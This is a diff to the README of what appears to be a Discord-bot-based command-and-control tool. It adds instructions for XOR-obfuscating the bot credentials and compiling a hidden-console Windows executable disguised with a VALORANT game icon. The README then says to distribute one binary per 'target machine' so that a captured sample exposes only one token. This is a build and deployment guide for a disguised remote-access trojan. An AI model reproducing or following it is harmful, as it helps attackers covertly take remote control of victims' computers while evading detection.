@@ -8,28 +8,33 @@ Custom C2 using Python compiled with Nuitka. Discord bot-based remote command ex
 
 ---
 
-## Build
+## Build (do this for each target machine)
 
-### Generate obfuscated config
+**You need a separate Discord bot token for each machine.** Create one in the [Discord Developer Portal](https://discord.com/developers/applications).
 
-**Before building,** generate XOR-obfuscated config from your real credentials:
+**Step 1 — Generate XOR-obfuscated config** (on your build machine, with the real token):
 
 ```bash
-python token_gen.py "<bot_token>" "<channel_id>" "<admin_id>"
+python token_gen.py "MT...your-bot-token..." "123456789" "987654321"
 ```
 
-This outputs Python lines to paste into `VALORANT.py`. The token, channel ID, and admin ID are stored XOR-obfuscated — never in plaintext in the source.
+Copy the `_TOKEN_XORED`, `_CHANNEL_XORED`, `_ADMIN_XORED` blocks it prints, and paste them into `VALORANT.py` (replacing the placeholder `0x00` lists).
 
-### Compile
+**Step 2 — Compile:**
 
 ```bash
 pip install -r requirements.txt
 python -m nuitka --onefile --windows-console-mode=disable \
     --windows-icon-from-ico=valorant.ico VALORANT.py
-move dist\VALORANT.exe ..
 ```
 
-### File structure
+**Step 3 — Distribute the `.exe` to the target machine.**
+
+Each target gets its own binary with its own bot token. If one binary is captured, only that machine's token is exposed — the others are unaffected.
+
+### One binary, one token, one machine
+
+Do not distribute the same binary to multiple machines. Each machine runs its own Discord bot with its own token. This is the isolation model.
 
 ```
 opss-terconnect/
